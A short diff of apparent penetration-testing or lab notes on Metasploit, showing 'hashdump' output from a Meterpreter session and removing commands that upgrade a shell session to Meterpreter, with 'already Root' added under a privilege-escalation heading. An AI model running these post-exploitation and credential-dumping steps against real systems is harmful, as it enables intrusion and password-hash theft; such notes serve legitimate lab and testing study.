@@ -136,21 +136,10 @@ meterpreter > hashdump
 -> 3 User: Administrator, Guest, Jon
 
 
-To upgrade the most recently opened session to Meterpreter using the sessions command:
-
-sessions -u -1
-
-Or run the shell_to_meterpreter module manually:
-
-use multi/manage/shell_to_meterpreter
-run session=-1
-run session=-1 win_transfer=POWERSHELL
-run session=-1 win_transfer=VBS
-
 
 # Privilege Escaltion
 
-
+already Root
   
   
 
